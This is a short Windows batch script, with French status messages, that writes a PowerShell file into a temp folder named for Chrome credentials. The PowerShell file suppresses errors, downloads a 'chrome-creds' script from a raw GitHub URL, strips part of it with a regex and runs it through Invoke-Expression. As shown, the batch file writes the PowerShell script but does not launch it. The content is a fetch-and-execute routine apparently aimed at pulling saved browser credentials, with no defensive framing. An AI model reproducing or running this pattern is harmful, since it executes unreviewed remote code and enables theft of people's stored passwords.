@echo off
set "WORK_DIR=%TEMP%\chrome_creds_tmp"
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
set "PS_OUT=%WORK_DIR%\run_chrome.ps1"
echo $ErrorActionPreference = 'SilentlyContinue' > "%PS_OUT%"
echo Write-Host '[LANCEMENT] Recuperation dynamique...' >> "%PS_OUT%"
echo $c = (Invoke-WebRequest 'https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1' -UseBasicParsing).Content >> "%PS_OUT%"
echo $c = $c -replace '(?s)\"Export\".*?\"Import\"', '\"Export\" { } \"Import\"' >> "%PS_OUT%"
echo Invoke-Expression $c >> "%PS_OUT%"
echo Done
